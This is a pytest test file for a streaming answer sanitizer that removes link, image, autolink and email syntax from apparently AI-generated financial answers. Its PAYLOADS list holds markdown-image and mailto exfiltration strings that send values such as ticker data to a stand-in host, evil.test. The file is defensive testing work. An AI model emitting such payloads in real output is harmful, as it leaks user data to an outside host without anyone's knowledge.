import re

import pytest

from utils.answer_sanitizer import AnswerSanitizer, sanitize

PAYLOADS = [
    "Up 2% ![x](https://evil.test/?d=63313) done.",
    "Up 2% ![c][r]\n\n[r]: //evil.test/?d=AAPL_6000\n",
    "Up 2% ![[a]](//evil.test/?d=1) [Reuters news](https://r.com) www.evil.test/a",
    "![c](https://evil.test/c?d=" + "9" * 600 + ")",
    "Source: <http:evil.test/?d=AAPL_60000> and <mailto:x@evil.test?body=63313>",
    "Mail AAPL6000@evil.test for details",
]


def stream(text: str, size: int) -> str:
    s = AnswerSanitizer()
    return "".join(s.feed(text[i : i + size]) for i in range(0, len(text), size)) + s.flush()


@pytest.mark.parametrize("payload", PAYLOADS)
@pytest.mark.parametrize("size", [1, 2, 3, 4, 7, 50])
def test_no_link_or_image_syntax_survives_streaming(payload, size):
    out = stream(payload, size)

    assert out == sanitize(payload)
    assert "[" not in out and "]" not in out
    assert "://" not in out
    assert "www." not in out.lower()
    assert re.search(r"<[A-Za-z]", out) is None
    assert re.search(r"\w@\w", out) is None


def test_plain_text_comparisons_and_cjk_pass_through():
    text = "Beta <1 but volatility >25% (see above).\n特斯拉今天下跌了7%。"
    assert stream(text, 2) == text


def test_streams_with_a_short_lag():
    s = AnswerSanitizer()
    assert s.feed("Apple rose 2% today") == "Apple rose 2% to"
    assert s.feed(".") == "d"
    assert s.flush() == "ay."
